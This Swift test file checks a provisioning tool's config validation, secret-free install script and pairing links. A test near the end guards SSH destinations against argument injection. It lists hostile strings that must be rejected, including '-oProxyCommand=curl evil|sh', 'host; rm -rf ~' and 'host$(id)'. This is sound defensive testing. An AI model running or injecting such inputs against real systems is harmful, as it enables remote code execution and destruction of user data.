// SPDX-License-Identifier: Apache-2.0
import Foundation
import Testing

@testable import ConduitProvisioner

/// The repo root, derived from this test file's path:
/// …/Eldr/Packages/Eldrctl/Tests/ConduitProvisionerTests/ConduitProvisionerTests.swift
private func repoRoot(file: StaticString = #filePath) -> URL {
    URL(fileURLWithPath: "\(file)")
        .deletingLastPathComponent()  // ConduitProvisionerTests/
        .deletingLastPathComponent()  // Tests/
        .deletingLastPathComponent()  // Eldrctl/
        .deletingLastPathComponent()  // Packages/
        .deletingLastPathComponent()  // Eldr/
}

private func validConfig() -> ConduitProvisioner.Config {
    ConduitProvisioner.Config(
        ownerHex: String(repeating: "a", count: 64),
        relayURL: "wss://relay.lerants.com")
}

// MARK: - validate()

@Test func validateAcceptsAGoodConfig() throws {
    try ConduitProvisioner(config: validConfig()).validate()
}

@Test func validateRejectsBadOwner() {
    var short = validConfig(); short.ownerHex = "abc"
    #expect(throws: ConduitProvisioner.ValidationError.invalidOwner("abc")) {
        try ConduitProvisioner(config: short).validate()
    }
    var nonHex = validConfig(); nonHex.ownerHex = String(repeating: "z", count: 64)
    #expect(throws: (any Error).self) { try ConduitProvisioner(config: nonHex).validate() }

    var empty = validConfig(); empty.ownerHex = "  "
    #expect(throws: ConduitProvisioner.ValidationError.emptyOwner) {
        try ConduitProvisioner(config: empty).validate()
    }
}

@Test func validateRejectsBadRelayAndPort() {
    var relay = validConfig(); relay.relayURL = "https://relay.example.com"
    #expect(throws: (any Error).self) { try ConduitProvisioner(config: relay).validate() }

    var port = validConfig(); port.gatewayPort = 70000
    #expect(throws: ConduitProvisioner.ValidationError.invalidGatewayPort(70000)) {
        try ConduitProvisioner(config: port).validate()
    }
}

// MARK: - scriptArguments()

@Test func scriptArgumentsCarryEveryParameterButNoSecret() {
    var cfg = validConfig()
    cfg.workdir = "/Users/me/proj"
    cfg.payloadDir = "/tmp/stage"
    cfg.responder = .eldrAcp
    let args = ConduitProvisioner(config: cfg).scriptArguments()

    // Stable, paired ordering.
    #expect(args.starts(with: ["--owner", cfg.ownerHex, "--relay", cfg.relayURL]))
    #expect(args.contains("--responder"))
    #expect(args.contains("eldr-acp"))
    #expect(contiguous(args, "--workdir", "/Users/me/proj"))
    #expect(contiguous(args, "--payload", "/tmp/stage"))
    #expect(args.contains("--with-app"))  // installApp defaults true
    // Never a token flag.
    #expect(!args.contains("--llm-token"))
    #expect(!args.joined(separator: " ").lowercased().contains("token"))
}

@Test func scriptArgumentsOmitOptionalsWhenEmpty() {
    var cfg = validConfig()
    cfg.installApp = false  // headless node only
    let args = ConduitProvisioner(config: cfg).scriptArguments()
    #expect(!args.contains("--with-app"))
    #expect(!args.contains("--workdir"))
    #expect(!args.contains("--payload"))
}

// MARK: - installScript (golden + invariants)

@Test func installScriptMatchesCheckedInFile() throws {
    let scriptURL = repoRoot().appendingPathComponent("Apps/Huginn/install-huginn.sh")
    // Record mode: materialize the checked-in file from the single source of truth.
    if ProcessInfo.processInfo.environment["ELDR_RECORD_GOLDEN"] == "1" {
        try ConduitProvisioner.installScript.write(to: scriptURL, atomically: true, encoding: .utf8)
    }
    let onDisk = try String(contentsOf: scriptURL, encoding: .utf8)
    #expect(
        onDisk == ConduitProvisioner.installScript,
        "install-huginn.sh drifted; re-record: ELDR_RECORD_GOLDEN=1 swift test --package-path Packages/Eldrctl")
}

@Test func installScriptHasTheRequiredShapeAndNoSecret() {
    let s = ConduitProvisioner.installScript
    for token in [
        "set -euo pipefail",
        "launchctl bootstrap",
        "chat.eldr.node",
        "eldr-node",
        "--import-token",
        "RunAtLoad",
        "LimitLoadToSessionType",
        "Aqua",
        "no unlocked GUI session",  // the headless preflight
    ] {
        #expect(s.contains(token), "install script missing required token: \(token)")
    }
    // C-8 / secret-free: the env file the script writes carries NO token line, and no token
    // value is ever embedded.
    #expect(!s.contains("ELDR_LLM_TOKEN='"))
    #expect(!s.contains("export ELDR_LLM_TOKEN="))
    // Idempotent reload (bootout before bootstrap).
    #expect(s.contains("launchctl bootout"))
}

// MARK: - pairingLink

@Test func pairingLinkFormatMatchesTheApp() {
    let plain = ConduitProvisioner.pairingLink(npub: "npub1abc", relay: nil)
    #expect(plain == "pqrc:add?npub=npub1abc&type=coding_agent")

    // Matches ACPBridgeService.deepLink exactly: `.urlQueryAllowed` leaves ":" and "/" as-is.
    let withRelay = ConduitProvisioner.pairingLink(npub: "npub1abc", relay: "wss://relay.lerants.com")
    #expect(withRelay == "pqrc:add?npub=npub1abc&type=coding_agent&relay=wss://relay.lerants.com")
    // A value with a query-reserved char IS encoded (space → %20).
    let spaced = ConduitProvisioner.pairingLink(npub: "npub1abc", relay: "wss://r x.com")
    #expect(spaced.hasSuffix("&relay=wss://r%20x.com"))
}

// MARK: - SSH destination safety (argument-injection guard)

@Test func sshDestination_rejectsOptionInjectionAndJunk_acceptsRealTargets() {
    // The attack: a leading '-' makes ssh/scp read the "host" as a client OPTION
    // (-oProxyCommand=…) and run an arbitrary local program.
    #expect(!ConduitProvisioner.isSafeSSHDestination("-oProxyCommand=curl evil|sh"))
    #expect(!ConduitProvisioner.isSafeSSHDestination("-J jump"))
    #expect(!ConduitProvisioner.isSafeSSHDestination(""))
    // Shell/space/metachar junk is refused (belt-and-suspenders; argv already bypasses
    // the shell, but a whitelisted destination is unambiguous).
    #expect(!ConduitProvisioner.isSafeSSHDestination("host; rm -rf ~"))
    #expect(!ConduitProvisioner.isSafeSSHDestination("host name"))
    #expect(!ConduitProvisioner.isSafeSSHDestination("host$(id)"))
    // Real destinations pass.
    #expect(ConduitProvisioner.isSafeSSHDestination("user@mac.local"))
    #expect(ConduitProvisioner.isSafeSSHDestination("192.168.1.20"))
    #expect(ConduitProvisioner.isSafeSSHDestination("user@host.example.com:2222"))
    #expect(ConduitProvisioner.isSafeSSHDestination("build-box"))
}

// MARK: - Runbook

@Test func runbookCoversTheKeySteps() {
    let r = Runbook.text
    for token in [
        "eldrctl install",
        "import-token",
        "pairing-link",
        "Drive this agent from here",  // remoteDevControlConsent surface
        "owner",
        "unlocked",  // the logged-in-session requirement
    ] {
        #expect(r.contains(token), "runbook missing: \(token)")
    }
}

// MARK: - helpers

/// True if `a` then `b` appear adjacently in `args`.
private func contiguous(_ args: [String], _ a: String, _ b: String) -> Bool {
    for i in args.indices.dropLast() where args[i] == a && args[i + 1] == b { return true }
    return false
}
